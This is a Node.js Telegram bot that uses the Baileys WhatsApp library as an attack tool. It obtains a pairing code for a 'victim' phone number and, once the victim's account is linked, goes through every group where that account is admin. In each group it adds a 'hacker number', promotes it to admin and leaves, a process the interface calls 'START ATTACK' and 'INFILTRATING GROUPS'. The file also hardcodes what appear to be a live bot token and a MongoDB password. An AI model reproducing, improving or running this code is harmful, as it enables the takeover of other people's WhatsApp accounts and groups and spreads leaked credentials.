// =================================================================
// ⚡ DX-SYSTEM ULTRA v10.0 (HYPER MAX - STABLE & PERFECT ALGO)
// 👨‍💻 Developed by: DX-CODEX (2026 Latest Architecture)
// =================================================================

import TelegramBot from 'node-telegram-bot-api';
import mongoose from 'mongoose';
import express from 'express';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    delay, 
    fetchLatestBaileysVersion, 
    jidNormalizedUser, 
    makeCacheableSignalKeyStore,
    Browsers
} from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs-extra';
import pn from 'awesome-phonenumber';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// --- [ ⚙️ CONFIGURATION ] ---
const CONFIG = {
    BOT_TOKEN: "8815061873:AAHz742vVWcT-De1akhFGbhRKevMYKvXeUw",
    MONGO_URL: "mongodb+srv://dxsimu:mnbvcxzdx@dxsimu.0qrxmsr.mongodb.net/?appName=dxsimu",
    OWNER_IDS: [6703335929, 5136260272, 7957605290],
};

// --- [ 🎨 DX FONT STYLER ] ---
const toDxFont = (text) => {
    const map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
        's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ',
        'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ',
        'S': 's', 'T': 'ᴛ', 'U': 's', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ'
    };
    return text.split('').map(c => map[c] || c).join('');
};

const ui = {
    header: (title) => `<b>⚡ ${toDxFont(title)}</b>\n━━━━━━━━━━━━━━━━━━━━`,
    error: (text) => `<b>💀 ᴇʀʀᴏʀ:</b> ${text}`,
    success: (text) => `<b>💎 sᴜᴄᴄᴇss:</b> ${text}`,
};

// --- [ 🗄️ DATABASE CONNECTION ] ---
mongoose.connect(CONFIG.MONGO_URL, {
    serverSelectionTimeoutMS: 30000,
    socketTimeoutMS: 45000,
})
    .then(() => console.log('✅ MongoDB Connected (DX-NET)'))
    .catch(err => console.error('❌ MongoDB Error:', err));

const userSchema = new mongoose.Schema({
    userId: { type: Number, unique: true },
    firstName: String,
    username: String,
    isBanned: { type: Boolean, default: false },
    waConnected: { type: Boolean, default: false },
    sudoNumber: { type: String, default: null },
    joinedDate: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);

// --- [ 🌐 SERVER KEEP-ALIVE ] ---
const app = express();
app.get('/', (req, res) => res.send('<b>⚡ DX-SYSTEM v10.0 ULTRA RUNNING... STATUS: ALIVE</b>'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🖥️ Server Online on Port: ${PORT}`));

// --- [ 🤖 BOT INIT & STATE MAPS ] ---
const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
const userStates = new Map();
const userDataCache = new Map();
const activeSessions = new Map();
const pairingTimers = new Map();
const processRunning = new Map();
const pairingRetryCount = new Map(); // 🟢 NEW: Track retry attempts per user

// --- [ 🛡️ HELPERS: FORCE CLEAN & CANCEL ] ---
async function isBanned(userId) {
    try {
        const user = await User.findOne({ userId });
        return user?.isBanned || false;
    } catch {
        return false;
    }
}

async function cleanSession(tgUserId, forceLogout = false) {
    const sessionPath = `./sessions/session_${tgUserId}`;
    
    // Clear pairing timeouts
    if (pairingTimers.has(tgUserId)) {
        clearTimeout(pairingTimers.get(tgUserId));
        pairingTimers.delete(tgUserId);
    }

    // Clear pairing retry count
    pairingRetryCount.delete(tgUserId);

    // Clear process running flag
    processRunning.delete(tgUserId);

    // Kill Socket completely
    if (activeSessions.has(tgUserId)) {
        try {
            const sock = activeSessions.get(tgUserId);
            if (forceLogout && typeof sock.logout === 'function') {
                await sock.logout().catch(() => {});
            }
            sock.ev.removeAllListeners();
            sock.end(undefined);
            if (sock.ws?.close) sock.ws.close();
        } catch (e) { /* silent cleanup */ }
        activeSessions.delete(tgUserId);
    }

    // Wipe Folder
    if (fs.existsSync(sessionPath)) {
        await fs.remove(sessionPath).catch(() => {});
    }

    // Clear States
    userStates.delete(tgUserId);
    userDataCache.delete(tgUserId);
    
    try {
        await User.updateOne({ userId: tgUserId }, { waConnected: false });
    } catch { /* ignore */ }
}

// =================================================================
// 🟢🟢🟢  BULLETPROOF PAIRING SYSTEM - COMPLETELY REWRITTEN  🟢🟢🟢
// =================================================================

/**
 * Waits for the socket connection to be fully ready before proceeding.
 * This is the #1 reason pairing fails - the socket isn't open yet.
 */
async function waitForSocketConnection(sock, tgUserId, maxWaitMs = 15000) {
    return new Promise((resolve) => {
        // Already connected
        if (sock.user?.id) return resolve(true);
        
        const checkInterval = setInterval(() => {
            if (sock.user?.id) {
                clearInterval(checkInterval);
                clearTimeout(failTimeout);
                resolve(true);
            }
        }, 500);
        
        const failTimeout = setTimeout(() => {
            clearInterval(checkInterval);
            resolve(false);
        }, maxWaitMs);
        
        // Also listen for the open event
        const onOpen = () => {
            clearInterval(checkInterval);
            clearTimeout(failTimeout);
            sock.ev.removeListener('connection.update', onOpen);
            resolve(true);
        };
        sock.ev.on('connection.update', onOpen);
    });
}

/**
 * Retry wrapper for pairing code request with exponential backoff
 */
async function requestPairingCodeWithRetry(sock, cleanPhone, maxRetries = 3) {
    let lastError = null;
    
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            // Small delay before each attempt to let socket breathe
            if (attempt > 1) await delay(2000 * attempt);
            
            const code = await sock.requestPairingCode(cleanPhone);
            
            // Validate we got a real code back
            if (code && code.length >= 6) {
                return code;
            }
            
            lastError = new Error(`Invalid code returned: ${code}`);
        } catch (err) {
            lastError = err;
            console.log(`⚠️ Pairing attempt ${attempt}/${maxRetries} failed: ${err.message}`);
            
            // If we get a specific "not connected" error, wait longer
            if (err.message?.includes('not connected') || err.message?.includes('disconnected')) {
                await delay(3000);
            }
        }
    }
    
    throw lastError || new Error('All pairing attempts exhausted');
}

// =================================================================
// 🟢  MAIN WHATSAPP SESSION - STRONGER THAN EVER
// =================================================================

async function startWhatsAppSession(tgUserId, loginPhone, sudoPhone) {
    await cleanSession(tgUserId);
    
    const sessionPath = `./sessions/session_${tgUserId}`;
    
    // Ensure session directory exists
    await fs.ensureDir(sessionPath).catch(() => {});
    
    // Validate phone number
    const pNumber = pn('+' + loginPhone.replace(/[^0-9]/g, ''));
    
    if (!pNumber.isValid()) {
        return bot.sendMessage(tgUserId, ui.error("Invalid Number Format!"), { parse_mode: 'HTML' }).catch(() => {});
    }
    const cleanPhone = pNumber.getNumber('e164').replace('+', '');

    // Initialize auth
    let state, saveCreds;
    try {
        const auth = await useMultiFileAuthState(sessionPath);
        state = auth.state;
        saveCreds = auth.saveCreds;
    } catch (err) {
        return bot.sendMessage(tgUserId, ui.error(`Auth initialization failed: ${err.message}`), { parse_mode: 'HTML' }).catch(() => {});
    }

    const { version } = await fetchLatestBaileysVersion();
    
    // Create socket with optimized settings for pairing
    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        browser: Browsers.ubuntu('Chrome'),
        markOnlineOnConnect: false,
        syncFullHistory: false,
        generateHighQualityLinkPreview: false,
        connectTimeoutMs: 30000,
        keepAliveIntervalMs: 10000,
        retryRequestDelayMs: 2000,
        defaultQueryTimeoutMs: 60000,
        // 🟢 CRITICAL: Don't emit pairing code too early
        emitPairingCode: false,
    });

    activeSessions.set(tgUserId, sock);

    // 🔥 NEW: Connection-update handler before pairing
    let connectionResolved = false;
    
    const connectionHandler = async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'open' && !connectionResolved) {
            connectionResolved = true;
            
            // Stop the 60s timer
            if (pairingTimers.has(tgUserId)) {
                clearTimeout(pairingTimers.get(tgUserId));
                pairingTimers.delete(tgUserId);
            }
            
            await bot.sendMessage(tgUserId, 
                ui.success(`<b>✅ Pairing Successful!</b>\nStarting Hyper Infiltration...`), 
                { parse_mode: 'HTML' }
            ).catch(() => {});
            
            try {
                await User.updateOne({ userId: tgUserId }, { waConnected: true });
            } catch { /* ignore */ }
            
            // Launch Algorithm
            await runAdvancedAlgorithm(sock, tgUserId, sudoPhone);
        }
        
        if (connection === 'close') {
            const statusCode = (lastDisconnect?.error)?.output?.statusCode;
            
            if (statusCode === DisconnectReason.loggedOut) {
                await cleanSession(tgUserId);
                await bot.sendMessage(tgUserId, ui.error("🚫 Logged Out from WhatsApp. Session wiped."), { parse_mode: 'HTML' }).catch(() => {});
            } 
            else if (statusCode === DisconnectReason.restartRequired) {
                try {
                    if (activeSessions.get(tgUserId)?.authState?.creds?.registered) {
                        startWhatsAppSession(tgUserId, loginPhone, sudoPhone);
                    }
                } catch { /* ignore restart loops */ }
            }
        }
    };
    
    sock.ev.on('connection.update', connectionHandler);
    sock.ev.on('creds.update', saveCreds);

    // ────────────────────────────────────────────────────────
    // 🟢🟢🟢  PAIRING SECTION - COMPLETELY REBUILT  🟢🟢🟢
    // ────────────────────────────────────────────────────────
    
    if (!state.creds.registered) {
        try {
            // Step 1: Send "initializing" message
            const statusMsg = await bot.sendMessage(tgUserId, 
                `⚙️ <b>${toDxFont("INITIALIZING WHATSAPP SOCKET...")}</b>`, 
                { parse_mode: 'HTML' }
            ).catch(() => null);

            // Step 2: Wait for socket to be fully connected
            const isConnected = await waitForSocketConnection(sock, tgUserId, 20000);
            
            if (!isConnected) {
                throw new Error('Socket did not connect within timeout');
            }
            
            // Update status
            if (statusMsg) {
                try {
                    await bot.editMessageText(
                        `🔗 <b>${toDxFont("REQUESTING PAIRING CODE...")}</b>`,
                        { chat_id: tgUserId, message_id: statusMsg.message_id, parse_mode: 'HTML' }
                    );
                } catch { /* ignore */ }
            }

            // Step 3: Extra safety delay - let everything settle
            await delay(2000);

            // Step 4: Request pairing code with retry logic
            let code = await requestPairingCodeWithRetry(sock, cleanPhone, 3);
            
            // Step 5: Format the code nicely
            let finalCode = code?.match(/.{1,4}/g)?.join('-') || code;
            
            // Step 6: Send the code to user
            const msg = `${ui.header('⚡ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ')}\n` +
                        `📱 ɴᴜᴍʙᴇʀ: <code>${cleanPhone}</code>\n` +
                        `🔑 ᴄᴏᴅᴇ: <code>${finalCode}</code>\n\n` +
                        `<i>⚠️ You have 60 seconds to login on WhatsApp.</i>\n` +
                        `<i>📌 Steps: Open WhatsApp → Linked Devices → Link a Device</i>`;
                        
            await bot.sendMessage(tgUserId, msg, { 
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🛑 CANCEL", callback_data: 'stop_process' }]] }
            }).catch(() => {});

            // Step 7: Set 60-second timeout for cancellation
            const timer = setTimeout(async () => {
                if (activeSessions.has(tgUserId)) {
                    try {
                        const checkSock = activeSessions.get(tgUserId);
                        // Check if still not registered
                        if (!checkSock.authState?.creds?.registered) {
                            await bot.sendMessage(tgUserId, 
                                ui.error("⏳ <b>Unsuccessful:</b> 60 seconds passed. Pairing request cancelled to prevent loops."), 
                                { parse_mode: 'HTML' }
                            ).catch(() => {});
                            await cleanSession(tgUserId);
                        }
                    } catch {
                        await cleanSession(tgUserId);
                    }
                }
            }, 60000);
            
            pairingTimers.set(tgUserId, timer);
            pairingRetryCount.set(tgUserId, 0);

        } catch (err) {
            // Enhanced error messaging
            let errorMsg = `Pairing Failed: ${err.message}`;
            
            if (err.message?.includes('not connected')) {
                errorMsg = "❌ Could not connect to WhatsApp servers. Check your internet connection.";
            } else if (err.message?.includes('timed out')) {
                errorMsg = "⏱️ Pairing request timed out. WhatsApp servers may be slow. Try again.";
            } else if (err.message?.includes('401')) {
                errorMsg = "🚫 Authentication rejected. Clean session and try again.";
            }
            
            await bot.sendMessage(tgUserId, ui.error(errorMsg), { parse_mode: 'HTML' }).catch(() => {});
            
            // Clean up on failure
            await cleanSession(tgUserId);
        }
    } else {
        // Already registered - skip pairing
        await bot.sendMessage(tgUserId, 
            ui.success(`<b>Already connected to WhatsApp!</b>\nStarting operation...`), 
            { parse_mode: 'HTML' }
        ).catch(() => {});
        
        await runAdvancedAlgorithm(sock, tgUserId, sudoPhone);
    }
}

// --- [ 🚀 HYPER ALGORITHM: SMART FILTER -> ADD -> PROMOTE -> LEAVE ] ---
async function runAdvancedAlgorithm(sock, tgUserId, targetNumber) {
    if (processRunning.get(tgUserId)) return;
    processRunning.set(tgUserId, true);
    
    try {
        const formattedSudo = targetNumber.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        
        // Wait for sock.user to be available
        let attempts = 0;
        while (!sock.user && attempts < 10) {
            await delay(1000);
            attempts++;
        }
        
        if (!sock.user) {
            await bot.sendMessage(tgUserId, ui.error("Could not get bot identity. Aborting."), { parse_mode: 'HTML' }).catch(() => {});
            await cleanSession(tgUserId);
            return;
        }
        
        const botId = jidNormalizedUser(sock.user.id);

        let statusMsg = await bot.sendMessage(tgUserId, 
            `🔍 <b>${toDxFont("SCANNING GROUPS...")}</b>`, 
            { 
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🛑 FORCE STOP", callback_data: 'stop_process' }]] }
            }
        ).catch(() => null);

        // Fetch groups with retry
        let groups = {};
        for (let i = 0; i < 3; i++) {
            try {
                groups = await sock.groupFetchAllParticipating();
                if (Object.keys(groups).length > 0) break;
            } catch (e) {
                await delay(2000);
            }
        }
        
        let validGroups = [];
        for (const jid in groups) {
            const meta = groups[jid];
            if (!meta.participants) continue;
            
            const botParticipant = meta.participants.find(p => jidNormalizedUser(p.id) === botId);
            const botIsAdmin = botParticipant?.admin === 'admin' || botParticipant?.admin === 'superadmin';
            
            // Only groups where bot is admin AND group is not announcement-only (open)
            if (botIsAdmin && !meta.announce) {
                validGroups.push(jid);
            }
        }

        if (validGroups.length === 0) {
            if (statusMsg) {
                try {
                    await bot.editMessageText(ui.error("No groups found where Bot is Admin. Aborting."), 
                        { chat_id: tgUserId, message_id: statusMsg.message_id, parse_mode: 'HTML' }
                    );
                } catch { /* ignore */ }
            }
            await cleanSession(tgUserId);
            return;
        }

        let stats = { success: 0, left: 0, fail: 0 };
        let count = 0;
        const total = validGroups.length;

        for (const jid of validGroups) {
            if (!activeSessions.has(tgUserId) || !processRunning.get(tgUserId)) break;

            count++;
            let progress = Math.floor((count / total) * 10);
            let bar = '▓'.repeat(progress) + '░'.repeat(10 - progress);
            
            if (statusMsg && (count % 2 === 0 || count === total)) {
                try {
                    await bot.editMessageText(
                        `⚙️ <b>${toDxFont("INFILTRATING GROUPS")}</b>\n[${bar}] ${Math.floor((count / total) * 100)}%\n\n<i>Target: ${count}/${total}</i>`, 
                        { 
                            chat_id: tgUserId, 
                            message_id: statusMsg.message_id, 
                            parse_mode: 'HTML',
                            reply_markup: { inline_keyboard: [[{ text: "🛑 FORCE STOP", callback_data: 'stop_process' }]] }
                        }
                    );
                } catch { /* ignore */ }
            }

            try {
                // Step 1: ADD Sudo User
                try {
                    const addResult = await sock.groupParticipantsUpdate(jid, [formattedSudo], "add");
                    await delay(1500);
                } catch (err) { 
                    // If number is already in group, that's fine
                }

                // Step 2: PROMOTE Sudo User
                try {
                    const freshMeta = await sock.groupMetadata(jid);
                    if (freshMeta.participants) {
                        const sudoUser = freshMeta.participants.find(p => 
                            jidNormalizedUser(p.id) === formattedSudo
                        );
                        
                        if (sudoUser && sudoUser.admin !== 'admin' && sudoUser.admin !== 'superadmin') {
                            await sock.groupParticipantsUpdate(jid, [formattedSudo], "promote");
                            stats.success++;
                            await delay(1500);
                        } else if (sudoUser?.admin) {
                            stats.success++;
                        }
                    }
                } catch (err) {
                    stats.fail++;
                }

                // Step 3: LEAVE Group
                try {
                    await sock.groupLeave(jid);
                    stats.left++;
                    await delay(2000);
                } catch (err) {
                    stats.fail++;
                }

            } catch (e) {
                stats.fail++;
            }
        }

        if (activeSessions.has(tgUserId)) {
            const report = ui.header('⚡ ᴏᴘᴇʀᴀᴛɪᴏɴ sᴜᴄᴄᴇssғᴜʟ') + 
                           `\n👑 <b>Admin Given:</b> ${stats.success}` +
                           `\n👋 <b>Bot Escaped:</b> ${stats.left}` +
                           `\n🛡️ <b>Failed:</b> ${stats.fail}` +
                           `\n\n<i>🔥 Operation 100% Executed.</i>`;
            
            await bot.sendMessage(tgUserId, report, { parse_mode: 'HTML' }).catch(() => {});
        }

    } catch (e) {
        await bot.sendMessage(tgUserId, ui.error("Operation Error: " + e.message), { parse_mode: 'HTML' }).catch(() => {});
    } finally {
        await cleanSession(tgUserId);
        processRunning.delete(tgUserId);
    }
}

// --- [ 🎮 TELEGRAM COMMANDS & UI ] ---

bot.onText(/\/(start|menu)/, async (msg) => {
    const chatId = msg.chat.id;
    if (await isBanned(chatId)) {
        return bot.sendMessage(chatId, ui.error("🚫 <b>BANNED</b>"), { parse_mode: 'HTML' }).catch(() => {});
    }

    await cleanSession(chatId);
    
    try {
        await User.updateOne({ userId: chatId }, { 
            firstName: msg.from.first_name, 
            username: msg.from.username 
        }, { upsert: true });
    } catch { /* ignore */ }

    const welcomeMsg = ui.header('ɴɪᴋᴏ sʏsᴛᴇᴍ ᴠ₁₀.₀') +
        `\n👋 <b>Hᴇʟʟᴏ ${msg.from.first_name}</b>\n` +
        `\n🚀 <b>Sᴛᴀᴛᴜs:</b> <code>ULTRA PRO</code>` +
        `\n\n${toDxFont("Press button to start process.")}`;

    bot.sendMessage(chatId, welcomeMsg, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "⚡ START ATTACK", callback_data: 'login' }],
                [{ text: "🛑 STOP CURRENT PROCESS", callback_data: 'stop_process' }]
            ]
        },
        parse_mode: 'HTML'
    }).catch(() => {});
});

bot.onText(/\/stop/, async (msg) => {
    const chatId = msg.chat.id;
    await cleanSession(chatId);
    bot.sendMessage(chatId, ui.success("System Stopped & Session Wiped."), { parse_mode: 'HTML' }).catch(() => {});
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (await isBanned(chatId)) {
        return bot.answerCallbackQuery(query.id, { text: "🚫 You are banned!" }).catch(() => {});
    }

    if (query.data === 'login') {
        await cleanSession(chatId);
        userStates.set(chatId, 'WAITING_LOGIN');
        
        await bot.sendMessage(chatId, 
            `📱 <b>Enter Victim WhatsApp Number:</b>\nEx: <code>919876543210</code>`, 
            { 
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🛑 CANCEL", callback_data: 'stop_process' }]] }
            }
        ).catch(() => {});
        
        await bot.answerCallbackQuery(query.id).catch(() => {});
    }
    
    if (query.data === 'stop_process') {
        await cleanSession(chatId);
        await bot.sendMessage(chatId, ui.success("🛑 Process Terminated! Session cleaned safely."), { parse_mode: 'HTML' }).catch(() => {});
        await bot.answerCallbackQuery(query.id).catch(() => {});
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (!text || text.startsWith('/')) return;
    if (await isBanned(chatId)) return;

    const state = userStates.get(chatId);
    if (!state) return;

    if (state === 'WAITING_LOGIN') {
        if (text.length < 7 || !/^\d+$/.test(text.replace(/[^0-9]/g, ''))) {
            return bot.sendMessage(chatId, ui.error("Invalid Number. Please enter a valid phone number (e.g., 919876543210)."), { parse_mode: 'HTML' }).catch(() => {});
        }
        
        userDataCache.set(chatId, { login: text });
        userStates.set(chatId, 'WAITING_SUDO');
        
        bot.sendMessage(chatId, 
            `👑 <b>Enter Hacker Number:</b>\n<i>(Who gets Admin)</i>\nEx: <code>919876543210</code>`, 
            { 
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🛑 CANCEL", callback_data: 'stop_process' }]] }
            }
        ).catch(() => {});
    }
    else if (state === 'WAITING_SUDO') {
        if (text.length < 7 || !/^\d+$/.test(text.replace(/[^0-9]/g, ''))) {
            return bot.sendMessage(chatId, ui.error("Invalid Number. Please enter a valid phone number."), { parse_mode: 'HTML' }).catch(() => {});
        }
        
        const data = userDataCache.get(chatId);
        userStates.delete(chatId);
        userDataCache.delete(chatId);
        
        try {
            await User.updateOne({ userId: chatId }, { sudoNumber: text });
        } catch { /* ignore */ }
        
        bot.sendMessage(chatId, 
            `⚙️ ${toDxFont("INJECTING SCRIPT...")}\nPlease wait.`, 
            { parse_mode: 'HTML' }
        ).catch(() => {});
        
        startWhatsAppSession(chatId, data.login, text);
    }
});

// --- [ 👮 ADMIN COMMANDS ] ---
bot.onText(/\/users/, async (msg) => {
    const chatId = msg.chat.id;
    if (!CONFIG.OWNER_IDS.includes(chatId)) return;

    try {
        const allUsers = await User.find({});
        let txt = "=== DX-SYSTEM DB ===\n";
        txt += "━━━━━━━━━━━━━━━━━━━━\n";
        allUsers.forEach((u, i) => {
            txt += `${i + 1}. ID: ${u.userId}\n`;
            txt += `   Name: ${u.firstName || 'N/A'}\n`;
            txt += `   Username: ${u.username || 'N/A'}\n`;
            txt += `   Sudo: ${u.sudoNumber || 'NONE'}\n`;
            txt += `   WA: ${u.waConnected ? '✅' : '❌'}\n`;
            txt += `   Banned: ${u.isBanned ? '🚫 YES' : '✅ NO'}\n`;
            txt += `   Joined: ${u.joinedDate?.toISOString().split('T')[0] || 'N/A'}\n`;
            txt += "━━━━━━━━━━━━━━━━━━━━\n";
        });
        txt += `\nTotal Users: ${allUsers.length}`;

        await bot.sendMessage(chatId, `<pre>${txt}</pre>`, { parse_mode: 'HTML' }).catch(() => {});
    } catch (err) {
        await bot.sendMessage(chatId, ui.error("Error fetching users: " + err.message), { parse_mode: 'HTML' }).catch(() => {});
    }
});

bot.onText(/\/ban (.+)/, async (msg, match) => {
    if (!CONFIG.OWNER_IDS.includes(msg.chat.id)) return;
    
    const tgUserId = Number(match[1].trim());
    if (isNaN(tgUserId)) {
        return bot.sendMessage(msg.chat.id, ui.error("Invalid user ID."), { parse_mode: 'HTML' }).catch(() => {});
    }
    
    try {
        const user = await User.findOneAndUpdate({ userId: tgUserId }, { isBanned: true });
        if (user) {
            await cleanSession(tgUserId, true);
            await bot.sendMessage(msg.chat.id, 
                ui.success(`User <b>${tgUserId}</b> has been BANNED.\nAll active WhatsApp sessions have been forcefully LOGGED OUT.`), 
                { parse_mode: 'HTML' }
            ).catch(() => {});
        } else {
            await bot.sendMessage(msg.chat.id, ui.error(`User ${tgUserId} not found in DB.`), { parse_mode: 'HTML' }).catch(() => {});
        }
    } catch (err) {
        await bot.sendMessage(msg.chat.id, ui.error("Ban error: " + err.message), { parse_mode: 'HTML' }).catch(() => {});
    }
});

bot.onText(/\/unban (.+)/, async (msg, match) => {
    if (!CONFIG.OWNER_IDS.includes(msg.chat.id)) return;
    
    const tgUserId = Number(match[1].trim());
    if (isNaN(tgUserId)) {
        return bot.sendMessage(msg.chat.id, ui.error("Invalid user ID."), { parse_mode: 'HTML' }).catch(() => {});
    }
    
    try {
        const result = await User.updateOne({ userId: tgUserId }, { isBanned: false });
        if (result.modifiedCount > 0) {
            await bot.sendMessage(msg.chat.id, ui.success(`User ${tgUserId} UNBANNED`), { parse_mode: 'HTML' }).catch(() => {});
        } else {
            await bot.sendMessage(msg.chat.id, ui.error(`User ${tgUserId} not found or already unbanned.`), { parse_mode: 'HTML' }).catch(() => {});
        }
    } catch (err) {
        await bot.sendMessage(msg.chat.id, ui.error("Unban error: " + err.message), { parse_mode: 'HTML' }).catch(() => {});
    }
});

// --- [ 🆘 HELP COMMAND ] ---
bot.onText(/\/help/, async (msg) => {
    const chatId = msg.chat.id;
    if (await isBanned(chatId)) return;
    
    const helpText = ui.header('ʜᴇʟᴘ ᴍᴇɴᴜ') +
        `\n📋 <b>Commands:</b>\n` +
        `\n/start - Launch the bot` +
        `\n/menu - Show main menu` +
        `\n/stop - Stop current process & wipe session` +
        `\n/help - Show this help message` +
        `\n\n👮 <b>Admin Only:</b>` +
        `\n/users - List all users` +
        `\n/ban [id] - Ban a user` +
        `\n/unban [id] - Unban a user`;
    
    bot.sendMessage(chatId, helpText, { parse_mode: 'HTML' }).catch(() => {});
});

// --- [ 🛡️ GLOBAL ERROR HANDLERS ] ---
process.on('uncaughtException', (e) => {
    console.log('⚠️ Uncaught Exception:', e.message);
    console.log(e.stack);
});

process.on('unhandledRejection', (e) => {
    console.log('⚠️ Unhandled Rejection:', e.message);
});

// --- [ 🎯 FINAL INIT LOG ] ---
console.log(`
╔═══════════════════════════════════════╗
║   ⚡ DX-SYSTEM ULTRA v10.0 ONLINE ⚡   ║
║   👨‍💻 Developed by: DX-CODEX           ║
║   📡 Status: OPERATIONAL               ║
╚═══════════════════════════════════════╝
`);
